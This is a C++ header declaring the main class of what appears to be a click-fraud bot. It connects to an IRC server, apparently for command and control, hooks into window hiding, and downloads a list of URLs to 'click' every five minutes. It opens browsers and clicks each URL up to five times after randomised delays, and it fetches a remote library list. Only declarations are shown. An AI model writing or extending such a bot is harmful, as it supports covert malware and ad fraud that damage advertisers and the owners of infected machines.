#pragma once

#include <set>
#include <functional>

#include <IRCClient.h>
#include <px_def.h>
#include <px_client.h>
#include <timer.h>
#include <hide_windows_hook.h>

#include "click_record.h"
#include "web_browser_info.h"

namespace projx {

	class MainProg : public Client {
		ClickRecord *current_url;
		ClickRecordSet loaded_urls;
		File click_records_file;
		Timer check_urls_timer, click_timer;
		WebBrowserInfo *last_used_browser;
		TimeDiff extra_click_delay, start_browser_delay;
		static constexpr TimeDiff kUpdUrlsDelay = 1000 * 60 * 5;  // Re-downloads the list of URLs 
															      // to click every 5 minutes to avoid too much traffic to the list URL.
		static constexpr TimeDiff kClickBaseDelay = 1000 * 10;
		static constexpr TimeDiff kClickRandDelayMin = 1000, kClickRandDelayMax = 10000;
		static constexpr TimeDiff kBrowserRandDelayMin = 1000 * 60 * 5, kBrowserRandDelayMax = 1000 * 60 * 10;
		//static constexpr TimeDiff kBrowserRandDelayMin = 1000, kBrowserRandDelayMax = 1000 * 2;  // For testing purposes.
		static constexpr unsigned int kClickMaxTimes = 5;
		MainProg();
		~MainProg();
	public:
		MainProg(const MainProg &) = delete;
		MainProg(MainProg &&) = delete;
		static MainProg &GetInstance();
		ProgError RunFrame();
		ProgError Stop() override;
		IrcConnectParams GetIrcParams() const override;
		std::string GetLibListUrl() const override;
		MainProg &operator=(const MainProg &) = delete;
		MainProg &operator=(MainProg &&) = delete;
	private:
		ProgError UpdateClickUrls();
		ProgError SaveClickRecords();
		ProgError TryClickCurrentUrl();
	};

	extern DWORD g_prev_proc_priority;

	inline void ResetPrevProcPriority() {
		if (g_prev_proc_priority != 0) {
			SetProgPriority(g_prev_proc_priority);
			g_prev_proc_priority = 0;
		}
	}

}  // namespace projx
